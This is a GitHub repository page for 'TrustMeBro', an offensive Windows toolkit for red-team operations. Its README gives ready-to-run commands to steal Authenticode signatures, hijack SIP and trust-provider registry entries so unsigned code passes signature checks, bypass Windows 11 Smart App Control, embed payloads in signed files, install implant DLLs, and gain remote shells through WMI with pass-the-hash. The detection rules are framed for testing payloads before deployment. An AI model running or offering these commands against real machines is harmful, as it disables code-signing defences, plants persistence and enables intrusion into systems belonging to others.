# https://github.com/KriyosArcane/TrustMeBro/

[Skip to content](https://github.com/KriyosArcane/TrustMeBro/#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/KriyosArcane/TrustMeBro/) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/KriyosArcane/TrustMeBro/) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/KriyosArcane/TrustMeBro/) to refresh your session.Dismiss alert

{{ message }}

[KriyosArcane](https://github.com/KriyosArcane)/ **[TrustMeBro](https://github.com/KriyosArcane/TrustMeBro)** Public

- [Notifications](https://github.com/login?return_to=%2FKriyosArcane%2FTrustMeBro) You must be signed in to change notification settings
- [Fork\\
16](https://github.com/login?return_to=%2FKriyosArcane%2FTrustMeBro)
- [Star\\
122](https://github.com/login?return_to=%2FKriyosArcane%2FTrustMeBro)


main

[**1** Branch](https://github.com/KriyosArcane/TrustMeBro/branches) [**0** Tags](https://github.com/KriyosArcane/TrustMeBro/tags)

[Go to Branches page](https://github.com/KriyosArcane/TrustMeBro/branches)[Go to Tags page](https://github.com/KriyosArcane/TrustMeBro/tags)

Go to file

Code

Open more actions menu

## Latest commit

[![KriyosArcane](https://avatars.githubusercontent.com/u/60072023?v=4&size=40)](https://github.com/KriyosArcane)[KriyosArcane](https://github.com/KriyosArcane/TrustMeBro/commits?author=KriyosArcane)

[Update README with caution note on registry changes](https://github.com/KriyosArcane/TrustMeBro/commit/fb3b99e6bad9080039e2cfd9b2d9196ba04a8151)

Open commit details

2 weeks agoAug 13, 2026

[fb3b99e](https://github.com/KriyosArcane/TrustMeBro/commit/fb3b99e6bad9080039e2cfd9b2d9196ba04a8151) · 2 weeks agoAug 13, 2026

## History

[55 Commits](https://github.com/KriyosArcane/TrustMeBro/commits/main/)

Open commit details

[View commit history for this file.](https://github.com/KriyosArcane/TrustMeBro/commits/main/) 55 Commits

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| [SigStash](https://github.com/KriyosArcane/TrustMeBro/tree/main/SigStash "SigStash") | [SigStash](https://github.com/KriyosArcane/TrustMeBro/tree/main/SigStash "SigStash") | [feat: 19 SIP GUIDs, FinalPolicy hijack, SigStash stub, detection pack…](https://github.com/KriyosArcane/TrustMeBro/commit/48c0971f2fff66abd7c04a8f6360122d7734fb8b "feat: 19 SIP GUIDs, FinalPolicy hijack, SigStash stub, detection pack, FormatGhost  SIP coverage expanded from 3 to 17 standard GUIDs + Smart App Control (Win11, separate --sac flag) + Win11 AppX extensions (--all-sips). Totals 19.  New features: - FinalPolicy hijack (SoftpubCleanup) via --action finalpolicy - Custom trust provider GUID via --action custom-provider - WOW64-only registry hijack (--wow64-only) - CryptSIPDllIsMyFileType2 exec surface (sip-exec subcommand) - SigStash self-extracting stub (SigStash/stub.c) - Dual-signed PE safe handling (--signer-index) - FormatGhost standalone tool (CryptDllFormatObject persistence) - Detection rule pack (7 YARA/Sigma rules + expanded SIP coverage rule) - Experimental: publisher-spoof, dual-signerinfo (docs only) - Full SIP map documentation (docs/SIP_COMPLETE_MAP.md)") | last monthJul 4, 2026 |
| [TrustMeBro](https://github.com/KriyosArcane/TrustMeBro/tree/main/TrustMeBro "TrustMeBro") | [TrustMeBro](https://github.com/KriyosArcane/TrustMeBro/tree/main/TrustMeBro "TrustMeBro") | [fix: Static link C++ (fix SSH output), fix Trust Provider $DLL/$Funct…](https://github.com/KriyosArcane/TrustMeBro/commit/3bd58c81e7e7b9b8bf8215f9c1408225ee5f1390 "fix: Static link C++ (fix SSH output), fix Trust Provider $DLL/$Function, fix Impacket -force flag  Three bugs found during QA on HTB target (Win Server 2019): 1. C++ tool produced zero output over SSH because mingw libstdc++    DLLs were missing on target. Fix: -static link. Also added    setvbuf unbuffered for stdout/stderr. 2. Trust Provider registry keys use $DLL and $Function (with dollar    sign), not Dll/FuncName. Fixed in both C++ (SetTrustProviderValues)    and Python (FINALPOLICY_HIJACK/CLEAN dicts). 3. Impacket reg.py does not support -force flag. Removed from    run_reg_cmd in Python.") | last monthJul 4, 2026 |
| [bin](https://github.com/KriyosArcane/TrustMeBro/tree/main/bin "bin") | [bin](https://github.com/KriyosArcane/TrustMeBro/tree/main/bin "bin") | [fix: Static link C++ (fix SSH output), fix Trust Provider $DLL/$Funct…](https://github.com/KriyosArcane/TrustMeBro/commit/3bd58c81e7e7b9b8bf8215f9c1408225ee5f1390 "fix: Static link C++ (fix SSH output), fix Trust Provider $DLL/$Function, fix Impacket -force flag  Three bugs found during QA on HTB target (Win Server 2019): 1. C++ tool produced zero output over SSH because mingw libstdc++    DLLs were missing on target. Fix: -static link. Also added    setvbuf unbuffered for stdout/stderr. 2. Trust Provider registry keys use $DLL and $Function (with dollar    sign), not Dll/FuncName. Fixed in both C++ (SetTrustProviderValues)    and Python (FINALPOLICY_HIJACK/CLEAN dicts). 3. Impacket reg.py does not support -force flag. Removed from    run_reg_cmd in Python.") | last monthJul 4, 2026 |
| [detection](https://github.com/KriyosArcane/TrustMeBro/tree/main/detection "detection") | [detection](https://github.com/KriyosArcane/TrustMeBro/tree/main/detection "detection") | [chore: Clean up detection rules to only cover TrustMeBro techniques](https://github.com/KriyosArcane/TrustMeBro/commit/318ec9e63b4fa67fdd84ec1c051b8b46f7fb4fbd "chore: Clean up detection rules to only cover TrustMeBro techniques  Removed 5 rules for external techniques not in this repo (ESBCACHE, dual-SignerInfo, FFI behavior). Consolidated 3 fragmented SIP YARA rules into one. Added SigStash embed detection rule. All files now prefixed with trustmebro_ for easy identification.  4 rules remain: - trustmebro_sip_hijack.yar (SIP hijack loaders + registry exports) - trustmebro_sip_hijack_registry.sigma (SIP registry modification) - trustmebro_finalpolicy_hijack.sigma (FinalPolicy custom provider) - trustmebro_sigstash_embed.yar (PKCS#7 embed tooling + large certs)") | last monthJul 4, 2026 |
| [docs](https://github.com/KriyosArcane/TrustMeBro/tree/main/docs "docs") | [docs](https://github.com/KriyosArcane/TrustMeBro/tree/main/docs "docs") | [Add SIPExec docs and diagrams](https://github.com/KriyosArcane/TrustMeBro/commit/891f8ad1f9b29910f772548a7be2803a15662f13 "Add SIPExec docs and diagrams  - Add SIPExec section to README with usage examples and MITRE mapping - Add 06-sip-exec-surface.svg (execution surface diagram) - Add 09-sipexec-flow.svg (lateral movement flow diagram) - Enable SMB2 in sipexec SMB server") | 3 weeks agoAug 9, 2026 |
| [experimental](https://github.com/KriyosArcane/TrustMeBro/tree/main/experimental "experimental") | [experimental](https://github.com/KriyosArcane/TrustMeBro/tree/main/experimental "experimental") | [feat: 19 SIP GUIDs, FinalPolicy hijack, SigStash stub, detection pack…](https://github.com/KriyosArcane/TrustMeBro/commit/48c0971f2fff66abd7c04a8f6360122d7734fb8b "feat: 19 SIP GUIDs, FinalPolicy hijack, SigStash stub, detection pack, FormatGhost  SIP coverage expanded from 3 to 17 standard GUIDs + Smart App Control (Win11, separate --sac flag) + Win11 AppX extensions (--all-sips). Totals 19.  New features: - FinalPolicy hijack (SoftpubCleanup) via --action finalpolicy - Custom trust provider GUID via --action custom-provider - WOW64-only registry hijack (--wow64-only) - CryptSIPDllIsMyFileType2 exec surface (sip-exec subcommand) - SigStash self-extracting stub (SigStash/stub.c) - Dual-signed PE safe handling (--signer-index) - FormatGhost standalone tool (CryptDllFormatObject persistence) - Detection rule pack (7 YARA/Sigma rules + expanded SIP coverage rule) - Experimental: publisher-spoof, dual-signerinfo (docs only) - Full SIP map documentation (docs/SIP_COMPLETE_MAP.md)") | last monthJul 4, 2026 |
| [sipexec](https://github.com/KriyosArcane/TrustMeBro/tree/main/sipexec "sipexec") | [sipexec](https://github.com/KriyosArcane/TrustMeBro/tree/main/sipexec "sipexec") | [sipexec: fix powershell quoting (^; escape for cmd.exe)](https://github.com/KriyosArcane/TrustMeBro/commit/11ef055900418d6803713bccb246c2c717471a48 "sipexec: fix powershell quoting (^; escape for cmd.exe)") | 2 weeks agoAug 12, 2026 |
| [slides](https://github.com/KriyosArcane/TrustMeBro/tree/main/slides "slides") | [slides](https://github.com/KriyosArcane/TrustMeBro/tree/main/slides "slides") | [Add LinkedIn QR code to closing slide](https://github.com/KriyosArcane/TrustMeBro/commit/c6d47f18613a6203cfaf9f4bbdd33faeeaf0493b "Add LinkedIn QR code to closing slide") | 3 weeks agoAug 7, 2026 |
| [tools/FormatGhost](https://github.com/KriyosArcane/TrustMeBro/tree/main/tools/FormatGhost "This path skips through empty directories") | [tools/FormatGhost](https://github.com/KriyosArcane/TrustMeBro/tree/main/tools/FormatGhost "This path skips through empty directories") | [feat: 19 SIP GUIDs, FinalPolicy hijack, SigStash stub, detection pack…](https://github.com/KriyosArcane/TrustMeBro/commit/48c0971f2fff66abd7c04a8f6360122d7734fb8b "feat: 19 SIP GUIDs, FinalPolicy hijack, SigStash stub, detection pack, FormatGhost  SIP coverage expanded from 3 to 17 standard GUIDs + Smart App Control (Win11, separate --sac flag) + Win11 AppX extensions (--all-sips). Totals 19.  New features: - FinalPolicy hijack (SoftpubCleanup) via --action finalpolicy - Custom trust provider GUID via --action custom-provider - WOW64-only registry hijack (--wow64-only) - CryptSIPDllIsMyFileType2 exec surface (sip-exec subcommand) - SigStash self-extracting stub (SigStash/stub.c) - Dual-signed PE safe handling (--signer-index) - FormatGhost standalone tool (CryptDllFormatObject persistence) - Detection rule pack (7 YARA/Sigma rules + expanded SIP coverage rule) - Experimental: publisher-spoof, dual-signerinfo (docs only) - Full SIP map documentation (docs/SIP_COMPLETE_MAP.md)") | last monthJul 4, 2026 |
| [.gitignore](https://github.com/KriyosArcane/TrustMeBro/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/KriyosArcane/TrustMeBro/blob/main/.gitignore ".gitignore") | [feat: 19 SIP GUIDs, FinalPolicy hijack, SigStash stub, detection pack…](https://github.com/KriyosArcane/TrustMeBro/commit/48c0971f2fff66abd7c04a8f6360122d7734fb8b "feat: 19 SIP GUIDs, FinalPolicy hijack, SigStash stub, detection pack, FormatGhost  SIP coverage expanded from 3 to 17 standard GUIDs + Smart App Control (Win11, separate --sac flag) + Win11 AppX extensions (--all-sips). Totals 19.  New features: - FinalPolicy hijack (SoftpubCleanup) via --action finalpolicy - Custom trust provider GUID via --action custom-provider - WOW64-only registry hijack (--wow64-only) - CryptSIPDllIsMyFileType2 exec surface (sip-exec subcommand) - SigStash self-extracting stub (SigStash/stub.c) - Dual-signed PE safe handling (--signer-index) - FormatGhost standalone tool (CryptDllFormatObject persistence) - Detection rule pack (7 YARA/Sigma rules + expanded SIP coverage rule) - Experimental: publisher-spoof, dual-signerinfo (docs only) - Full SIP map documentation (docs/SIP_COMPLETE_MAP.md)") | last monthJul 4, 2026 |
| [LICENSE](https://github.com/KriyosArcane/TrustMeBro/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/KriyosArcane/TrustMeBro/blob/main/LICENSE "LICENSE") | [license: Switch to MIT, add BOFs section to README](https://github.com/KriyosArcane/TrustMeBro/commit/6ca6e4f97626995742bce59ef6f50899c28a75b6 "license: Switch to MIT, add BOFs section to README") | last monthJul 4, 2026 |
| [README.md](https://github.com/KriyosArcane/TrustMeBro/blob/main/README.md "README.md") | [README.md](https://github.com/KriyosArcane/TrustMeBro/blob/main/README.md "README.md") | [Update README with caution note on registry changes](https://github.com/KriyosArcane/TrustMeBro/commit/fb3b99e6bad9080039e2cfd9b2d9196ba04a8151 "Update README with caution note on registry changes  Added caution note about registry changes and their caching behavior.") | 2 weeks agoAug 13, 2026 |
| [TrustMeBro.py](https://github.com/KriyosArcane/TrustMeBro/blob/main/TrustMeBro.py "TrustMeBro.py") | [TrustMeBro.py](https://github.com/KriyosArcane/TrustMeBro/blob/main/TrustMeBro.py "TrustMeBro.py") | [fix: Python sip-exec GUID alias resolution, list subcommand, --local](https://github.com/KriyosArcane/TrustMeBro/commit/feeedb29b2939632fc1fdc895ffe64b7ebfe1bf5 "fix: Python sip-exec GUID alias resolution, list subcommand, --local  Three gaps from QA fixed: 1. --guid pe now resolves to {C689AAB8-...} via GUID_ALIASES table 2. Added 'list' subcommand (--local uses winreg, remote prints reg query) 3. --local flag on install/remove writes registry directly via winreg 4. Added resolve_sip_alias() matching C++ resolve_guid() behavior") | last monthJul 4, 2026 |
| View all files |

## Repository files navigation

# TrustMeBro

[Permalink: TrustMeBro](https://github.com/KriyosArcane/TrustMeBro/#trustmebro)

Authenticode signature manipulation toolkit for Red Team operations and security research. Covers signature stealing, metadata cloning, SIP hijacking across 19 file types, WinVerifyTrust FinalPolicy bypass, PKCS#7 payload embedding, SIP execution surface implants, and analyst-triggered persistence via OID handlers.

Available in Python (cross-platform) and C++ (Windows native).

📖 **[Wiki](https://github.com/KriyosArcane/TrustMeBro/wiki)** — Deep-dive documentation, SIP maps, OPSEC notes, detection rules, and research notes.

Caution

**Registry changes are cached per-process.** After running `hijack`, `sip-exec install`, or `clean`, you must **log out and log back in** or start a new process to see the effect. If `signtool verify` or `Get-AuthenticodeSignature` still shows the old result, close the process and open a fresh one. FinalPolicy and SIP hijack changes survive reboot.

## Repository Structure

[Permalink: Repository Structure](https://github.com/KriyosArcane/TrustMeBro/#repository-structure)

```
TrustMeBro/
├── TrustMeBro/                         C++ native tool
│   ├── main.cpp                        Subcommand-based CLI
│   ├── steal.h                         Signature stealing, SIP hijack, FinalPolicy
│   ├── pkcs7_embed.h                   Zero-dependency ASN.1 DER embed/extract
│   └── TrustMeBro.inf                  INF-based SIP hijack (right-click Install)
├── SigStash/                           Payload extraction from signed PEs
│   ├── loader.cpp                      Argument-based loader (reads a carrier file)
│   └── stub.c                          Self-extracting stub (reads its own PE)
├── sipexec/                            Lateral movement via WVT FinalPolicy hijack
│   ├── sipexec.py                      Orchestrator (upload, hijack, trigger, shell)
│   ├── sipexec_payload.c              Payload DLL source
│   └── sipexec_payload_signed.dll      Pre-built signed payload
├── tools/
│   └── FormatGhost/                    CryptDllFormatObject persistence tool
├── detection/                          YARA and Sigma detection rules
├── bin/                                Pre-compiled Windows binaries
├── TrustMeBro.py                       Python cross-platform tool
├── LICENSE
└── README.md
```

* * *

## How It Works

[Permalink: How It Works](https://github.com/KriyosArcane/TrustMeBro/#how-it-works)

### SigFlip (CVE-2013-3900), for comparison

[Permalink: SigFlip (CVE-2013-3900), for comparison](https://github.com/KriyosArcane/TrustMeBro/#sigflip-cve-2013-3900-for-comparison)

[![SigFlip embeds payload in certificate table padding](https://github.com/KriyosArcane/TrustMeBro/raw/main/docs/01-sigflip.svg)](https://github.com/KriyosArcane/TrustMeBro/blob/main/docs/01-sigflip.svg)

### SigStash, Direct Mode

[Permalink: SigStash, Direct Mode](https://github.com/KriyosArcane/TrustMeBro/#sigstash-direct-mode)

[![SigStash embeds payload inside PKCS#7 DER unsignedAttrs](https://github.com/KriyosArcane/TrustMeBro/raw/main/docs/02-sigstash-direct.svg)](https://github.com/KriyosArcane/TrustMeBro/blob/main/docs/02-sigstash-direct.svg)

### SigStash, Camouflage Mode

[Permalink: SigStash, Camouflage Mode](https://github.com/KriyosArcane/TrustMeBro/#sigstash-camouflage-mode)

[![SigStash wraps payload in fake SPC_NESTED_SIGNATURE](https://github.com/KriyosArcane/TrustMeBro/raw/main/docs/03-sigstash-camouflage.svg)](https://github.com/KriyosArcane/TrustMeBro/blob/main/docs/03-sigstash-camouflage.svg)

* * *

## Smart App Control Bypass (Win11)

[Permalink: Smart App Control Bypass (Win11)](https://github.com/KriyosArcane/TrustMeBro/#smart-app-control-bypass-win11)

TrustMeBro includes a SIP hijack for Windows 11 Smart App Control (SAC). This is a separate GUID not included in the default hijack set. You must opt in with `--sac`.

**GUID:**`{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}`

**What SAC does:** Smart App Control blocks unsigned or untrusted executables from running on Win11 machines with enforcement enabled. It checks the SIP verification result via `SrpCheckSmartlockerEAandProcessToken` in wintrust.dll.

**What the bypass does:** Redirects the SAC SIP's `CryptSIPDllVerifyIndirectData` to `ntdll!DbgUiContinue`. SAC's verification returns success for all files. Unsigned, unknown executables run without the "Smart App Control blocked an app" prompt.

**What was observed during testing:**

- Before hijack: SAC correctly blocked an unsigned EXE
- After hijack + reboot: the unsigned EXE ran, MessageBox displayed
- SAC settings UI showed "On" during the bypass. Enforcement was silently disabled at the SIP level.

**How it was found:** Reverse engineered from Win11 24H2 wintrust.dll via Ghidra. The GUID sits in the builtin SIP table at `.rdata` offset `0x62410`. Cross-references reveal three kernel EAs: `$Kernel.Smartlocker.OriginClaim`, `$Kernel.Purge.Smartlocker.Valid`, `$Kernel.Smartlocker.Hash`.

**Usage:**

```
:: C++ (local)
TrustMeBro.exe hijack --sip-types PE --sac

:: Python (remote)
python3 TrustMeBro.py hijack 10.0.0.1 -u Admin -p Pass --sac

:: Python (local)
python3 TrustMeBro.py hijack --local --sac

:: Clean
TrustMeBro.exe hijack --clean
```

The `probe` command reports whether SAC is active on the target:

```
TrustMeBro.exe probe
  Smart App Control:       YES    <-- SAC is enforcing
```

> **Win11 only.** This GUID does not exist on Win10 or Server 2019. Using `--sac` on those systems writes a key that has no effect.

**MITRE:** T1553.003 (Subvert Trust Controls: SIP and Trust Provider Hijacking) + T1562.001 (Impair Defenses: Disable or Modify Tools)

* * *

## C++ Usage

[Permalink: C++ Usage](https://github.com/KriyosArcane/TrustMeBro/#c-usage)

### steal

[Permalink: steal](https://github.com/KriyosArcane/TrustMeBro/#steal)

Steal signature and metadata from a donor PE. File operations only, no registry changes.

```
TrustMeBro.exe steal explorer.exe agent.exe
TrustMeBro.exe steal explorer.exe agent.exe --clone
```

After stealing, the signature will not validate until you run `hijack` or `--finalpolicy`.

### hijack

[Permalink: hijack](https://github.com/KriyosArcane/TrustMeBro/#hijack)

Install SIP or FinalPolicy persistence on the local machine. Requires admin.

> **Log out and log back in** after running hijack, or open a new process. SIP DLLs are cached in each process at first use. FinalPolicy and SIP hijack survive reboot.

```
:: SIP hijack (default: PE, PowerShell, MSI)
TrustMeBro.exe hijack --sip-types PE,PowerShell,MSI

:: All 17 standard SIP types
TrustMeBro.exe hijack --sip-types all

:: Include Smart App Control (Win11)
TrustMeBro.exe hijack --sip-types all --sac

:: All 19 SIP GUIDs
TrustMeBro.exe hijack --all-sips

:: FinalPolicy bypass (system-wide, all files pass signature checks)
TrustMeBro.exe hijack --finalpolicy

:: Custom trust provider GUID (evades detection on Authenticode GUID)
TrustMeBro.exe hijack --custom-provider {GUID}

:: WOW64-only (hijack 32-bit callers, leave 64-bit registry clean)
TrustMeBro.exe hijack --sip-types all --wow64-only

:: Reverse any hijack with --clean
TrustMeBro.exe hijack --clean
TrustMeBro.exe hijack --finalpolicy --clean
TrustMeBro.exe hijack --custom-provider {GUID} --clean

:: Preview without writing
```

### embed

[Permalink: embed](https://github.com/KriyosArcane/TrustMeBro/#embed)

Embed payload into a signed PE's PKCS#7 signature. The Authenticode signature remains valid.

```
TrustMeBro.exe embed payload.bin signed.exe output.exe
TrustMeBro.exe embed payload.bin signed.exe output.exe --camouflage
TrustMeBro.exe embed payload.bin signed.exe output.exe --oid 1.3.6.1.4.1.55555.1.1
```

### extract

[Permalink: extract](https://github.com/KriyosArcane/TrustMeBro/#extract)

Extract embedded payload from a signed PE.

```
TrustMeBro.exe extract output.exe recovered.bin
TrustMeBro.exe extract output.exe recovered.bin --camouflage
```

### sip-exec

[Permalink: sip-exec](https://github.com/KriyosArcane/TrustMeBro/#sip-exec)

Install, remove, or list payload DLLs on the SIP execution surface.

> **The payload DLL loads in the next process that calls WinVerifyTrust.** Log out and log back in, or start a new verification process, to trigger it.

Named GUID aliases: `pe`, `ps1`, `jscript`, `vbscript`, `wsf`, `cab`, `catalog`, `appx`, `appx-bundle`, `msi`, `ctl`, `esd`, `sac`

```
:: Install implant
TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid pe

:: Remove implant
TrustMeBro.exe sip-exec remove --guid pe
TrustMeBro.exe sip-exec --clean --guid pe

:: List all registered SIP triggers
TrustMeBro.exe sip-exec list

:: Preview
```

### probe

[Permalink: probe](https://github.com/KriyosArcane/TrustMeBro/#probe)

Query local Code Integrity enforcement state. No writes. No admin required.

```
TrustMeBro.exe probe
```

Reports: CI enabled, test-signing, UMCI, debug mode, flight signing, HVCI, HVCI strict, Smart App Control, audit mode.

### clean

[Permalink: clean](https://github.com/KriyosArcane/TrustMeBro/#clean)

Remove persistence artifacts. Requires at least one scope flag.

> **Log out and log back in** after cleanup. Already-running processes retain cached values.

```
TrustMeBro.exe clean --sip
TrustMeBro.exe clean --finalpolicy
TrustMeBro.exe clean --custom-provider {GUID}
TrustMeBro.exe clean --all
```

* * *

## Python Usage

[Permalink: Python Usage](https://github.com/KriyosArcane/TrustMeBro/#python-usage)

The Python tool operates **remotely by default** (via Impacket for registry operations). Add `--local` to run on the local Windows machine using `winreg`.

File operations (steal, embed, extract) always run locally on whatever machine the script is on.

Requirements: Python 3.10+, `asn1crypto` (for embed/extract), `objcopy` (for metadata cloning), `impacket` (for remote hijack).

```
pip install asn1crypto
```

### steal

[Permalink: steal](https://github.com/KriyosArcane/TrustMeBro/#steal-1)

```
python3 TrustMeBro.py steal -s explorer.exe -t agent.exe
python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --clone
```

### hijack (remote)

[Permalink: hijack (remote)](https://github.com/KriyosArcane/TrustMeBro/#hijack-remote)

> **Target must log out and log back in** or start a new process to see the changes.

```
# SIP hijack (default: PE, PowerShell, MSI)
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass

# Pick specific SIP types
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types PE,VBScript,JScript

# All 17 standard SIPs
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types all

# All 19 (including SAC + Win11)
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --all-sips

# Smart App Control only (Win11)
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sac

# FinalPolicy hijack
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy

# Custom trust provider
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider

# WOW64-only
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --wow64-only

# Reverse
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action clean
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy-clean
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider-clean --provider-guid {GUID}

# Preview
```

### hijack (local)

[Permalink: hijack (local)](https://github.com/KriyosArcane/TrustMeBro/#hijack-local)

Run on the local Windows machine. No IP or credentials needed.

```
python3 TrustMeBro.py hijack --local --action hijack
python3 TrustMeBro.py hijack --local --action finalpolicy
python3 TrustMeBro.py hijack --local --action clean
python3 TrustMeBro.py hijack --local --sip-types all --sac
```

### embed / extract

[Permalink: embed / extract](https://github.com/KriyosArcane/TrustMeBro/#embed--extract)

```
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --camouflage
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --signer-index 0
python3 TrustMeBro.py extract -s output.exe -o recovered.bin
python3 TrustMeBro.py extract -s output.exe -o recovered.bin --camouflage
```

### sip-exec

[Permalink: sip-exec](https://github.com/KriyosArcane/TrustMeBro/#sip-exec-1)

```
python3 TrustMeBro.py sip-exec --dll "C:\Temp\implant.dll"
python3 TrustMeBro.py sip-exec --dll "C:\Temp\implant.dll" --guid pe
python3 TrustMeBro.py sip-exec --clean --guid pe
```

### INF-based SIP Hijack

[Permalink: INF-based SIP Hijack](https://github.com/KriyosArcane/TrustMeBro/#inf-based-sip-hijack)

Quick local hijack without running the EXE:

```
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\TrustMeBro\TrustMeBro.inf
```

* * *

## Beacon Object Files (Cobalt Strike + Adaptix)

[Permalink: Beacon Object Files (Cobalt Strike + Adaptix)](https://github.com/KriyosArcane/TrustMeBro/#beacon-object-files-cobalt-strike--adaptix)

8 BOFs in a separate repo: [TrustMeBOF](https://github.com/KriyosArcane/TrustMeBOF)

```
git clone https://github.com/KriyosArcane/TrustMeBOF.git
cd TrustMeBOF && ./setup.sh
```

* * *

## SigStash (Payload Loader and Self-Extracting Stub)

[Permalink: SigStash (Payload Loader and Self-Extracting Stub)](https://github.com/KriyosArcane/TrustMeBro/#sigstash-payload-loader-and-self-extracting-stub)

### Loader (`SigStash/loader.cpp`)

[Permalink: Loader (SigStash/loader.cpp)](https://github.com/KriyosArcane/TrustMeBro/#loader-sigstashloadercpp)

Takes a carrier PE path as an argument. Supports direct OID and camouflage mode.

```
SigStashLoader.exe carrier.exe
SigStashLoader.exe carrier.exe --camouflage
SigStashLoader.exe carrier.exe --exec
```

### Self-Extracting Stub (`SigStash/stub.c`)

[Permalink: Self-Extracting Stub (SigStash/stub.c)](https://github.com/KriyosArcane/TrustMeBro/#self-extracting-stub-sigstashstubc)

Reads its own PE from disk. Writes payload to `%TEMP%\sigstash_out.bin`. No arguments needed.

```
1. Compile stub (or with -DCAMOUFLAGE_MODE=1)
2. Sign with osslsigncode or signtool
3. Embed: python3 TrustMeBro.py embed -s signed_stub.exe -p payload.bin -o final.exe
4. Run final.exe on target
```

* * *

## SIPExec (Lateral Movement)

[Permalink: SIPExec (Lateral Movement)](https://github.com/KriyosArcane/TrustMeBro/#sipexec-lateral-movement)

Remote command execution via WinVerifyTrust FinalPolicy hijack. Stages a payload DLL on the target, hijacks the trust provider registry via WMI, triggers a WMI provider load that invokes WVT, and gets a shell over a named pipe inside `wmiprvse.exe`. No new process is created — code runs inside the existing WMI provider host.

### SIP Execution Surface

[Permalink: SIP Execution Surface](https://github.com/KriyosArcane/TrustMeBro/#sip-execution-surface)

[![SIP execution surface — DLL loads during file-type routing](https://github.com/KriyosArcane/TrustMeBro/raw/main/docs/06-sip-exec-surface.svg)](https://github.com/KriyosArcane/TrustMeBro/blob/main/docs/06-sip-exec-surface.svg)

### SIPExec Lateral Movement Flow

[Permalink: SIPExec Lateral Movement Flow](https://github.com/KriyosArcane/TrustMeBro/#sipexec-lateral-movement-flow)

[![SIPExec lateral movement chain](https://github.com/KriyosArcane/TrustMeBro/raw/main/docs/09-sipexec-flow.svg)](https://github.com/KriyosArcane/TrustMeBro/blob/main/docs/09-sipexec-flow.svg)

**MITRE:** T1553.003 (SIP and Trust Provider Hijacking) + T1047 (WMI) + T1021.002 (SMB)

```
# One-shot command
python3 sipexec/sipexec.py 'DOMAIN/user:password@target' whoami

# Interactive shell (runs inside wmiprvse.exe)
python3 sipexec/sipexec.py 'DOMAIN/user:password@target'

# Pass the hash
python3 sipexec/sipexec.py -hashes :NTHASH 'DOMAIN/user@target'

# Fileless — serve DLL over UNC, nothing written to target disk
sudo python3 sipexec/sipexec.py -serve -listen 10.0.0.5 'user:pass@target'
```

See [`sipexec/README.md`](https://github.com/KriyosArcane/TrustMeBro/blob/main/sipexec/README.md) for build instructions and all options.

* * *

## FormatGhost (Standalone Tool)

[Permalink: FormatGhost (Standalone Tool)](https://github.com/KriyosArcane/TrustMeBro/#formatghost-standalone-tool)

Standalone at `tools/FormatGhost/`. Registers a DLL as a `CryptDllFormatObject` handler. The DLL loads when `certutil -dump` or any cert UI parses a PE with the registered OID. Requires admin. Requires user interaction to trigger. See `tools/FormatGhost/README.md`.

* * *

## Experimental

[Permalink: Experimental](https://github.com/KriyosArcane/TrustMeBro/#experimental)

Research prototypes. Not production-ready.

- `experimental/publisher-spoof/` generates self-signed certs with chosen CN for publisher name spoofing.
- `experimental/dual-signerinfo/` documents kernel vs user-mode SignerInfo parser divergence (docs only).

* * *

## Detection Rules

[Permalink: Detection Rules](https://github.com/KriyosArcane/TrustMeBro/#detection-rules)

YARA and Sigma rules in `detection/`. Test your payloads against these before deployment.

| File | Format | Detects |
| --- | --- | --- |
| `trustmebro_sip_hijack.yar` | YARA | SIP hijack loaders and registry exports with DbgUiContinue |
| `trustmebro_sip_hijack_registry.sigma` | Sigma | SIP provider registry modification |
| `trustmebro_finalpolicy_hijack.sigma` | Sigma | FinalPolicy under non-standard action GUID |
| `trustmebro_sigstash_embed.yar` | YARA | SigStash tooling and signed PEs with large WIN\_CERTIFICATE |

* * *

## Building from Source

[Permalink: Building from Source](https://github.com/KriyosArcane/TrustMeBro/#building-from-source)

```
# TrustMeBro main tool
x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/TrustMeBro.exe TrustMeBro/main.cpp -lshlwapi

# SigStash loader
x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/SigStashLoader.exe SigStash/loader.cpp

# SigStash self-extracting stub
x86_64-w64-mingw32-gcc -O2 -s -o bin/SigStashStub.exe SigStash/stub.c -lkernel32
x86_64-w64-mingw32-gcc -O2 -s -DCAMOUFLAGE_MODE=1 -o bin/SigStashStubCamo.exe SigStash/stub.c -lkernel32

# SIPExec payload DLL
x86_64-w64-mingw32-gcc -shared -O2 -Wall -o sipexec/sipexec_payload.dll sipexec/sipexec_payload.c

# FormatGhost DLL
cd tools/FormatGhost && make
```

No external dependencies for C++ tools.

* * *

## SIP GUID Reference

[Permalink: SIP GUID Reference](https://github.com/KriyosArcane/TrustMeBro/#sip-guid-reference)

Full 19-GUID map with hijack results, handler DLLs, and file-type detection methods: [docs/SIP\_COMPLETE\_MAP.md](https://github.com/KriyosArcane/TrustMeBro/blob/main/docs/SIP_COMPLETE_MAP.md)

* * *

## Disclaimer

[Permalink: Disclaimer](https://github.com/KriyosArcane/TrustMeBro/#disclaimer)

